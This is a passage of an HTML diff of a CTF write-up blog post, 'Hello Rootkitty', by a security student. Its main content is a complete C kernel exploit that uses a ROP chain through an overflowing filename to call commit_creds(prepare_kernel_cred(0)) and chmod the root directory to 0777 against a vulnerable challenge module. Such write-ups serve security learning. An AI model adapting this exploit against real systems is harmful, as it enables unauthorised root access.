class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">// gcc exploit.c -static -o exploit
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+#include &lt;time.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;assert.h&gt;
+
+#define BUF_SIZE 1024
+
+struct cred;
+struct task_struct;
+
+struct linux_dirent {
+           long           d_ino;
+           off_t          d_off;
+           unsigned short d_reclen;
+           char           d_name[];
+};
+
+
+typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
+typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
+
+
+prepare_kernel_cred_t   prepare_kernel_cred;
+commit_creds_t    commit_creds;
+
+static void
+kernel_code(void)
+{
+    commit_creds(prepare_kernel_cred(0));
+    syscall(SYS_chmod, &#34;/&#34;, 0777);
+    exit(0);
+}
+
+
+unsigned long get_kernel_sym(char *name) {
+    FILE *f;
+    unsigned long addr;
+    char dummy;
+    char sname[256];
+    int ret = 0;
+
+
+    f = fopen(&#34;/proc/kallsyms&#34;, &#34;r&#34;);
+    if (f == NULL) {
+        printf(&#34;[-] Failed to open /proc/kallsyms\n&#34;);
+        exit(-1);
+    }
+    printf(&#34;[&#43;] Find %s...\n&#34;, name);
+    while(ret != EOF) {
+        ret = fscanf(f, &#34;%p %c %s\n&#34;, (void **)&amp;addr, &amp;dummy, sname);
+        if (ret == 0) {
+            fscanf(f, &#34;%s\n&#34;, sname);
+            continue;
+        }
+        if (!strcmp(name, sname)) {
+            fclose(f);
+            printf(&#34;[&#43;] Found %s at %lx\n&#34;, name, addr);
+            return addr;
+        }
+    }
+    fclose(f);
+    return 0;
+}
+
+
+int main() {
+
+    int fd, nread;
+    char buf[BUF_SIZE];
+    struct linux_dirent *d;
+    char file_name[138] = &#34;/home/ctf/ecsc_flag_AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYY&#34;;
+    char *p;
+    void *payload;
+
+    unsigned long base_addr, stack_addr, mmap_addr, *fake_stack, *fake_stack2;
+
+    unsigned long kernel_base, sys_chmod;
+
+    kernel_base = get_kernel_sym(&#34;startup_64&#34;);
+
+    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(&#34;prepare_kernel_cred&#34;);
+    commit_creds = (commit_creds_t)get_kernel_sym(&#34;commit_creds&#34;);
+
+
+    payload = malloc(0x100);
+    memset(payload, 0x00, 0x100);
+
+    fake_stack = (unsigned long *)(payload);
+
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x1c251;           //pop rax ; ret
+    *fake_stack &#43;&#43;= 0x4141414141414141;
+
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x1cc22e;          //pop rcx ; ret
+    *fake_stack &#43;&#43;= (0x4141414141414141 ^ (unsigned long)kernel_code);
+                                                    // can&#39;t send null bytes xoring address
+
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x2c9efc;          // xor rax, rcx ; ret
+
+
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x230bf6;         //push rsi ; call rax
+
+
+    memcpy(file_name &#43; 122, payload, 0x100);
+    puts(file_name);
+
+
+    fd = open(file_name, O_RDWR|O_CREAT, 0777);
+    close(fd);
+
+
+    fd = open(&#34;/home/ctf/&#34;, O_RDONLY | O_DIRECTORY);
+    nread = syscall(SYS_getdents, fd, buf, BUF_SIZE);
+
+    return 0;
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/pwn/">pwn</a>
+
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/kernel/">kernel</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/dvid-characteristics-2/" data-tooltip="DVID : Characteristics 2">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 Hugo VINCENT. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/dvid-characteristics-2/" data-tooltip="DVID : Characteristics 2">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fhug0vincent.github.io%2F2020%2F05%2Fhello-rootkitty%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fhug0vincent.github.io%2F2020%2F05%2Fhello-rootkitty%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Hugo VINCENT</h4>
+    
+      <div id="about-card-bio">Student in computer security</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Student at INSA / SIF master
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        France
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+                <h3 class="media-heading">Hello Rootkitty</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2020
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     ecsc Hello Rootkitty pwn 500 24    TL;DR A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.
+Description    Recon I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/dvid-characteristics-2/">
+                <h3 class="media-heading">DVID : Characteristics 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Introduction I recently bought a DVID board which is an open source vulnerable designed IoT device. In this post I will try to explain how to solve the third challenge of the DVID project. In this challenge we need to write data to a special characteristic.
+Challenge Let&rsquo;s flash the firmware, enable and setup the usb dongle:
+     1
+2
+3
+  sudo avrdude -c usbasp -p m328p -U flash:w:characteristics2.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/dvid-characteristics/">
+                <h3 class="media-heading">DVID : Characteristics</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Introduction I recently bought a DVID board which is an open source vulnerable designed IoT device. In this post I will try to explain how to solve the second Bluetooth challenge of the DVID project. In this challenge we need to read data from a special characteristic.
+Challenge Let&rsquo;s flash the firmware, enable Bluetooth and setup the usb dongle:
+     1
+2
+3
+  sudo avrdude -c usbasp -p m328p -U flash:w:characteristics.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/ble-introduction/">
+                <h3 class="media-heading">BLE introduction</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Introduction I recently bought a DVID board which is an open source vulnerable designed IoT device. In this post I will try to explain how the Bluetooth protocol works and how we can solve the first Bluetooth challenge of the DVID project.
+Bluetooth protocol This talk is a good introduction to Bluetooth hacking, what&rsquo;s following come from this document, but if you want more details you should read it. The next diagram shows how a typical connection between a phone and a Bluetooth device work.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/tmnt/">
+                <h3 class="media-heading">TMNT</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+                <h3 class="media-heading">Pwn Run See (part 1 &amp; 2)</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/filereader/">
+                <h3 class="media-heading">Filereader</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/give-me-your-shell/">
+                <h3 class="media-heading">Give Me Your Shell</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     inshack-2019 gimme-your-shell pwn 50 67    TL;DR This is a remote buffer overflow challenge, there is no protection on the binary but ASLR is enable on the remote server. I redirected the execution flow to write my shellcode to a controled area, then jump to it and execute it.
+Getting informations First I looked at the protections on the binary :</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-1/">
+                <h3 class="media-heading">Mission impossible 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi1 Forensic/Crypto 800 18    TL;DR After downloading the zip file we were faced with a linux memory dump. After building the correct profile for volatility you had to perform a known plain text attack on an encrypted and splited zip file to recover the file flag.txt.
+Introduction After downloading the file MI1.zip we had a memdump.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+                <h3 class="media-heading">Mission impossible 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         10 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://hug0vincent.github.io/images/bg2.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://hug0vincent.github.io/js/script-hbdqx7wlhrscaipt6txjo74wihw1bagwt97hjgdefg9y8kq3xpotphkbsilg.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/hug0vincent.github.io\/2020\/05\/hello-rootkitty\/';
+          
+            this.page.identifier = '\/2020\/05\/hello-rootkitty\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'https-hug0vincent-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
